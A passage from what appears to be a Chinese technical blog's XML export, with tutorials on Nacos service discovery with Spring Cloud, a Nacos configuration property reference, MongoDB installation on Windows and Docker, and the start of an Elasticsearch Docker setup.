    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPayment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"服务名："</span> <span class="token operator">+</span> serverName <span class="token operator">+</span> <span class="token string">"&lt;br /&gt; 端口号： "</span> <span class="token operator">+</span> serverPort <span class="token operator">+</span> <span class="token string">"&lt;br /&gt; 传入的参数："</span> <span class="token operator">+</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动模块, 提示  <strong>register finished</strong> 注册完成。查看Nacos服务列表，此时 producer  服务已注册，实例数为1。</p>
</li>
<li>
<p>使用浏览器访问http://localhost:8001/nacos/1 验证实例是否正常提供服务</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510181828965.png" alt="image-20230510181828965"></p>
</li>
</ol>
<h3 id="producer-b">producer_b</h3>
<ol>
<li>
<p>pom.xml ：同 producer_a</p>
</li>
<li>
<p>application.yml</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8002</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> producer
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> native.virtual.com<span class="token punctuation">:</span><span class="token number">8848</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.cloud.nacos.server<span class="token punctuation">-</span>addr<span class="token punctuation">}</span>
        <span class="token key atrule">namespace</span><span class="token punctuation">:</span> learn<span class="token punctuation">-</span>$<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
        <span class="token key atrule">service</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.application.name<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动类上，使用 <code>@EnableDiscoveryClient</code> 注解开启 Nacos 服务发现功能</p>
</li>
<li>
<p>提供服务的业务方法（测试类）</p>
</li>
<li>
<p>启动模块。查看Nacos服务列表，此时 producer  服务已注册，实例数为2。</p>
</li>
<li>
<p>使用浏览器访问http://localhost:8002/nacos/1 验证实例是否正常提供服务</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510182034079.png" alt="image-20230510182034079"></p>
</li>
</ol>
<h2 id="注册服务消费者">注册服务消费者</h2>
<h3 id="consumer">consumer</h3>
<ol>
<li>
<p>pom.xml</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-discovery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!--由于 Netflix Ribbon 进入停更维护阶段，因此新版本的 Nacos discovery 都已经移除了 Ribbon ，此时我们需要引入 loadbalancer 代替 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-loadbalancer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>application.yml</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8101</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> consumer
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> native.virtual.com<span class="token punctuation">:</span><span class="token number">8848</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.cloud.nacos.server<span class="token punctuation">-</span>addr<span class="token punctuation">}</span>
        <span class="token key atrule">namespace</span><span class="token punctuation">:</span> learn<span class="token punctuation">-</span>$<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
        <span class="token key atrule">register-enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
<span class="token key atrule">service-url</span><span class="token punctuation">:</span>
  <span class="token key atrule">nacos-user-service</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//producer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>创建一个<code>配置类</code>，使用 @LoadBalanced 注解与 Ribbon 进行集成开启负载均衡功能</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>loadbalancer<span class="token punctuation">.</span></span><span class="token class-name">LoadBalanced</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">RestTemplate</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationContextBean</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Bean</span>
    <span class="token annotation punctuation">@LoadBalanced</span> <span class="token comment">//与 Ribbon 集成，并开启负载均衡功能</span>
    <span class="token keyword">public</span> <span class="token class-name">RestTemplate</span> <span class="token function">getRestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>创建消费者测试类</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConsumerController</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">RestTemplate</span> restTemplate<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${service-url.nacos-user-service}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> serverURL<span class="token punctuation">;</span> <span class="token comment">//服务提供者的服务名</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/consumer/nacos/{id}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">paymentInfo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> restTemplate<span class="token punctuation">.</span><span class="token function">getForObject</span><span class="token punctuation">(</span>serverURL <span class="token operator">+</span> <span class="token string">"/nacos/"</span> <span class="token operator">+</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动consumer模块</p>
</li>
<li>
<p>使用浏览器多次访问 <code>http://localhost:8101/consumer/nacos/1</code>。</p>
<p>浏览器地址不变，4次请求结果如下</p>
<table>
<thead>
<tr>
<th>请求次数</th>
<th>返回结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>服务名：producer<br>端口号： 8001<br>传入的参数：1</td>
</tr>
<tr>
<td>2</td>
<td>服务名：producer<br>端口号： 8002<br>传入的参数：1</td>
</tr>
<tr>
<td>3</td>
<td>服务名：producer<br>端口号： 8001<br>传入的参数：1</td>
</tr>
<tr>
<td>4</td>
<td>服务名：producer<br>端口号： 8002<br>传入的参数：1</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h2 id="问题记录">问题记录</h2>
<ol>
<li>nacos服务部署时， 配置的默认路径由  <code>server.servlet.contextPath=/nacos</code> 修改为  <code>server.servlet.contextPath=/</code>  API 查询结果404</li>
</ol>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos</title>
    <url>/20230301/c383a3c4.html</url>
    <content><![CDATA[<p>Nacos 是一个更易于帮助构建云原生应用的动态服务发现、配置和服务管理平台（参考自 <a href="https://nacos.io/zh-cn/index.html">Nacos 官网</a>）。</p>
<p>英文全称为 Dynamic Naming and Configuration Service，是一个由阿里巴巴团队使用 Java 语言开发的开源项目。Nacos 的命名是由 3 部分组成：</p>
<table>
<thead>
<tr>
<th>组成部分</th>
<th>全称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Na</td>
<td>naming/nameServer</td>
<td>即服务注册中心，与 Spring Cloud Eureka 的功能类似。</td>
</tr>
<tr>
<td>co</td>
<td>configuration</td>
<td>即配置中心，与 Spring Cloud Config+Spring Cloud Bus 的功能类似。</td>
</tr>
<tr>
<td>s</td>
<td>service</td>
<td>即服务，表示 Nacos 实现的服务注册中心和配置中心都是以服务为核心的。</td>
</tr>
</tbody>
</table>
<p>我们可以将 Nacos 理解成服务注册中心和配置中心的组合体。</p>
<ul>
<li>它可以替换 <a href="http://c.biancheng.net/springcloud/eureka.html">Eureka</a> 作为服务注册中心，实现服务的注册与发现；</li>
<li>可以替换 <a href="http://c.biancheng.net/springcloud/config.html">Spring Cloud Config</a> 作为配置中心，实现配置的动态刷新。</li>
</ul>
<p>Nacos 支持几乎所有主流类型“服务”的发现、配置和管理：</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/service/">Kubernetes Service</a></li>
<li><a href="https://grpc.io/docs/what-is-grpc/core-concepts#service-definition">gRPC </a>&amp; <a href="https://dubbo.apache.org/zh/">Dubbo RPC Service</a></li>
<li>Spring Cloud RESTful Service</li>
</ul>
<h1>Nacos 的特性</h1>
<p>Nacos 提供了一系列简单易用的特性，能够帮助我们快速地实现动态服务发现、服务配置等功能。</p>
<h2 id="服务发现">服务发现</h2>
<p>Nacos 支持基于 DNS 和 RPC 的服务发现。</p>
<p>当服务提供者使用原生 SDK、OpenAPI 或一个独立的 Agent TODO 向 Nacos 注册服务后，服务消费者可以在 Nacos 上通过 DNS TODO 或 HTTP&amp;API 查找、发现服务。</p>
<h2 id="服务健康监测">服务健康监测</h2>
<p>Nacos 提供对服务的实时健康检查，能够阻止请求发送到不健康主机或服务实例上。Nacos 还提供了一个健康检查仪表盘，能够帮助我们根据健康状态管理服务的可用性及流量。</p>
<h2 id="动态配置服务">动态配置服务</h2>
<p>动态配置服务可以让我们以中心化、外部化和动态化的方式，管理所有环境的应用配置和服务配置。</p>
<p>动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效、敏捷。</p>
<p>配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。</p>
<p>Nacos 提供了一个简洁易用的 UI 帮助我们管理所有服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助我们更安全地在生产环境中管理配置变更和降低配置变更带来的风险。</p>
<h2 id="动态-DNS-服务">动态 DNS 服务</h2>
<p>Nacos 提供了动态 DNS 服务，能够让我们更容易地实现负载均衡、流量控制以及数据中心内网的简单 DNS 解析服务。</p>
<p>Nacos 提供了一些简单的 DNS APIs TODO，可以帮助我们管理服务的关联域名和可用的 IP:PORT 列表。</p>
<h2 id="服务及其元数据管理">服务及其元数据管理</h2>
<p>Nacos 能让我们从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及 metrics 统计数据。</p>
<h1>Nacos 两大组件</h1>
<p>与 Eureka 类似，Nacos 也采用 CS（Client/Server，客户端/服务器）架构，它包含两大组件，如下表。</p>
<ol>
<li>
<p>Nacos Server</p>
<p>描述：</p>
<ul>
<li>Nacos 服务端，与 Eureka Server 不同，Nacos Server 由阿里巴巴团队使用 Java 语言编写并将 Nacos Server 的下载地址给用户，用户只需要直接下载并运行即可。</li>
</ul>
<p>功能：</p>
<ul>
<li>Nacos Server 可以作为服务注册中心，帮助 Nacos Client 实现服务的注册与发现。</li>
<li>Nacos Server 可以作为配置中心，帮助 Nacos Client 在不重启的情况下，实现配置的动态刷新。</li>
</ul>
</li>
<li>
<p>Nacos Client</p>
<p>描述：</p>
<ul>
<li>Nacos 客户端，通常指的是微服务架构中的各个服务，由用户自己搭建，可以使用多种语言编写。</li>
</ul>
<p>功能：</p>
<ul>
<li>
<p>Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-discovery，在服务注册中心（Nacos Server）中实现服务的注册与发现</p>
</li>
<li>
<p>Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-config，在配置中心（Nacos Server）中实现配置的动态刷新。</p>
</li>
</ul>
</li>
</ol>
<h1>Nacos 服务注册中心</h1>
<p>Nacos 作为服务注册中心可以实现服务的注册与发现，流程如下图。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1022563360-0.png" alt="Nacos 服务注册与发现"></p>
<p>在图 1 中共涉及到以下 3 个角色：</p>
<ul>
<li>服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。</li>
<li>服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。</li>
<li>服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。</li>
</ul>
<p>Nacos 实现服务注册与发现的流程如下：</p>
<ol>
<li>从 Nacos 官方提供的下载页面中，下载 Nacos Server 并运行。</li>
<li>服务提供者 Nacos Client 启动时，会把服务以服务名（<a href="http://spring.application.name">spring.application.name</a>）的方式注册到服务注册中心（Nacos Server）；</li>
<li>服务消费者 Nacos Client 启动时，也会将自己的服务注册到服务注册中心；</li>
<li>服务消费者在注册服务的同时，它还会从服务注册中心获取一份服务注册列表信息，该列表中包含了所有注册到服务注册中心上的服务的信息（包括服务提供者和自身的信息）；</li>
<li>在获取了服务提供者的信息后，服务消费者通过 HTTP 或消息中间件远程调用服务提供者提供的服务。</li>
</ol>
<h1>默认端口说明</h1>
<table>
<thead>
<tr>
<th>端口</th>
<th>与主端口的偏移量</th>
<th>描述</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>8848</td>
<td>0</td>
<td>主端口</td>
<td></td>
</tr>
<tr>
<td>9848</td>
<td>1000</td>
<td>客户端gRPC请求服务端端口，用于客户端向服务端发起连接和请求</td>
<td></td>
</tr>
<tr>
<td>9849</td>
<td>1001</td>
<td>服务端gRPC请求服务端端口，用于服务间同步等</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="Common-property-configuration">Common property configuration</h2>
<table>
<thead>
<tr>
<th>name</th>
<th>description</th>
<th>option</th>
</tr>
</thead>
<tbody>
<tr>
<td>MODE</td>
<td>cluster/standalone</td>
<td>cluster/standalone default <strong>cluster</strong></td>
</tr>
<tr>
<td>NACOS_SERVERS</td>
<td>nacos cluster address</td>
<td>eg. ip1:port1 ip2:port2 ip3:port3</td>
</tr>
<tr>
<td>PREFER_HOST_MODE</td>
<td>Whether hostname are supported</td>
<td>hostname/ip default <strong>ip</strong></td>
</tr>
<tr>
<td>NACOS_APPLICATION_PORT</td>
<td>nacos server port</td>
<td>default <strong>8848</strong></td>
</tr>
<tr>
<td>NACOS_SERVER_IP</td>
<td>custom nacos server ip when network was mutil-network</td>
<td></td>
</tr>
<tr>
<td>SPRING_DATASOURCE_PLATFORM</td>
<td>standalone support mysql</td>
<td>mysql / empty default empty</td>
</tr>
<tr>
<td>MYSQL_SERVICE_HOST</td>
<td>mysql host</td>
<td></td>
</tr>
<tr>
<td>MYSQL_SERVICE_PORT</td>
<td>mysql database port</td>
<td>default : <strong>3306</strong></td>
</tr>
<tr>
<td>MYSQL_SERVICE_DB_NAME</td>
<td>mysql database name</td>
<td></td>
</tr>
<tr>
<td>MYSQL_SERVICE_USER</td>
<td>username of database</td>
<td></td>
</tr>
<tr>
<td>MYSQL_SERVICE_PASSWORD</td>
<td>password of database</td>
<td></td>
</tr>
<tr>
<td>MYSQL_DATABASE_NUM</td>
<td>It indicates the number of database</td>
<td>default :<strong>1</strong></td>
</tr>
<tr>
<td>MYSQL_SERVICE_DB_PARAM</td>
<td>Database url parameter</td>
<td>default : <strong>characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useSSL=false</strong></td>
</tr>
<tr>
<td>JVM_XMS</td>
<td>-Xms</td>
<td>default :1g</td>
</tr>
<tr>
<td>JVM_XMX</td>
<td>-Xmx</td>
<td>default :1g</td>
</tr>
<tr>
<td>JVM_XMN</td>
<td>-Xmn</td>
<td>default :512m</td>
</tr>
<tr>
<td>JVM_MS</td>
<td>-XX:MetaspaceSize</td>
<td>default :128m</td>
</tr>
<tr>
<td>JVM_MMS</td>
<td>-XX:MaxMetaspaceSize</td>
<td>default :320m</td>
</tr>
<tr>
<td>NACOS_DEBUG</td>
<td>enable remote debug</td>
<td>y/n default :n</td>
</tr>
<tr>
<td>TOMCAT_ACCESSLOG_ENABLED</td>
<td>server.tomcat.accesslog.enabled</td>
<td>default :false</td>
</tr>
<tr>
<td>NACOS_AUTH_SYSTEM_TYPE</td>
<td>The auth system to use, currently only ‘nacos’ is supported</td>
<td>default :nacos</td>
</tr>
<tr>
<td>NACOS_AUTH_ENABLE</td>
<td>If turn on auth system</td>
<td>default :false</td>
</tr>
<tr>
<td>NACOS_AUTH_TOKEN_EXPIRE_SECONDS</td>
<td>The token expiration in seconds</td>
<td>default :18000</td>
</tr>
<tr>
<td>NACOS_AUTH_TOKEN</td>
<td>The default token</td>
<td>default :SecretKey012345678901234567890123456789012345678901234567890123456789</td>
</tr>
<tr>
<td>NACOS_AUTH_CACHE_ENABLE</td>
<td>Turn on/off caching of auth information. By turning on this switch, the update of auth information would have a 15 seconds delay.</td>
<td>default : false</td>
</tr>
<tr>
<td>MEMBER_LIST</td>
<td>Set the cluster list with a configuration file or command-line argument</td>
<td>eg:192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809</td>
</tr>
<tr>
<td>EMBEDDED_STORAGE</td>
<td>Use embedded storage in cluster mode without mysql</td>
<td><code>embedded</code> default : none</td>
</tr>
<tr>
<td>NACOS_AUTH_CACHE_ENABLE</td>
<td>nacos.core.auth.caching.enabled</td>
<td>default : false</td>
</tr>
<tr>
<td>NACOS_AUTH_USER_AGENT_AUTH_WHITE_ENABLE</td>
<td>nacos.core.auth.enable.userAgentAuthWhite</td>
<td>default : false</td>
</tr>
<tr>
<td>NACOS_AUTH_IDENTITY_KEY</td>
<td>nacos.core.auth.server.identity.key</td>
<td>default : serverIdentity</td>
</tr>
<tr>
<td>NACOS_AUTH_IDENTITY_VALUE</td>
<td>nacos.core.auth.server.identity.value</td>
<td>default : security</td>
</tr>
<tr>
<td>NACOS_SECURITY_IGNORE_URLS</td>
<td>nacos.security.ignore.urls</td>
<td>default : <code>/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**</code></td>
</tr>
</tbody>
</table>
<p>参考</p>
<ul>
<li><a href="http://c.biancheng.net/springcloud/nacos.html">http://c.biancheng.net/springcloud/nacos.html</a></li>
<li><a href="https://www.jb51.net/article/235057.htm">https://www.jb51.net/article/235057.htm</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB安装</title>
    <url>/20221031/c5d54bc1.html</url>
    <content><![CDATA[<h1>Windows 安装</h1>
<h2 id="安装文件">安装文件</h2>
<p>现官网只含64位的安装文件，或者去以下路径下载： <a href="http://dl.mongodb.org/dl/win32/x86_64">http://dl.mongodb.org/dl/win32/x86_64</a></p>
<h2 id="环境变量">环境变量</h2>
<pre class="line-numbers language-none"><code class="language-none">MONGODB_HOME：D:\ProgramSoft\MongoDB

path追加：%MONGODB_HOME%\bin;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="安装服务">安装服务</h2>
<p>前提：创建文件夹 <code>E:\ProgramData\db</code> 和 <code>E:\ProgramData\log</code></p>
<p>系统管理员操作</p>
<ol>
<li>创建服务</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc create mongodb <span class="token assign-left variable">binPath</span><span class="token operator">=</span> <span class="token string">"D:\ProgramSoft\MongoDB<span class="token entity" title="\b">\b</span>in\mongod.exe --service --dbpath E:\ProgramData\db --logpath=E:\ProgramData\log\mongodb.log --logappend"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li>删除服务</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc delete mongodb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16383252343726.png" alt="460c99600f3e8207ce486a218ed21620.png"></p>
<p>错误记录：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383252343727.png" alt="6495b50cee3c37ebdbff17f02d31dd12.png"></p>
<p>异常1： 服务开启不了 发生服务特定错误: 100，发生服务特定错误: 48<br>
原因，service安装语句</p>
<pre class="line-numbers language-none"><code class="language-none">sc create mongodb binPath= "D:\ProgramSoft\MongoDB\bin\mongod.exe --service --dbpath D:\mongodb\data --logpath=E:\ProgramData\log\mongodb.log --logappend --directoryperdb"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>解决方案：</p>
<ol>
<li>
<p>删除<code>E:\ProgramData\db\mongod.lock文件</code></p>
</li>
<li>
<p>删除服务</p>
<pre class="line-numbers language-none"><code class="language-none">net stop mongodb;
net delete mongodb;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>重新安装 注意：去除<code>--directoryperdb</code>命令</p>
<pre class="line-numbers language-none"><code class="language-none">sc create mongodb binPath= "D:\ProgramSoft\MongoDB\bin\mongod.exe --service --dbpath D:\mongodb\data --logpath=E:\ProgramData\log\mongodb.log --logappend"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h1>Docker</h1>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3.9'</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
    <span class="token key atrule">mongodb</span><span class="token punctuation">:</span>
        <span class="token key atrule">image</span><span class="token punctuation">:</span> mongo<span class="token punctuation">:</span>4.2.2
        <span class="token key atrule">container_name</span><span class="token punctuation">:</span> <span class="token string">"mongodb"</span>
        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
        <span class="token key atrule">environment</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> TZ=Asia/Shanghai
            <span class="token punctuation">-</span> MONGO_INITDB_ROOT_USERNAME=admin
            <span class="token punctuation">-</span> MONGO_INITDB_ROOT_PASSWORD=你的密码
        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> /opt/docker_data/mongo/logs<span class="token punctuation">:</span>/var/log/mongodb
            <span class="token punctuation">-</span> /opt/docker_data/mongo/data/db<span class="token punctuation">:</span>/data/db
            <span class="token punctuation">-</span> /opt/docker_data/mongo/data/configdb<span class="token punctuation">:</span>/data/configdb
        <span class="token key atrule">ports</span><span class="token punctuation">:</span>
            <span class="token punctuation">-</span> 27017<span class="token punctuation">:</span><span class="token number">27017</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch安装</title>
    <url>/20230618/872a239c.html</url>
    <content><![CDATA[<h1>Docker</h1>
<p>参考：<a href="https://new.nanxiangquan.com/2023/04/26/docker%E9%83%A8%E7%BD%B2elk/">https://new.nanxiangquan.com/2023/04/26/docker部署elk/</a></p>
<h2 id="单机">单机</h2>
<h3 id="docker-compose">docker-compose</h3>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3.9'</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">elasticsearch-standalone</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> elasticsearch<span class="token punctuation">:</span>7.2.0
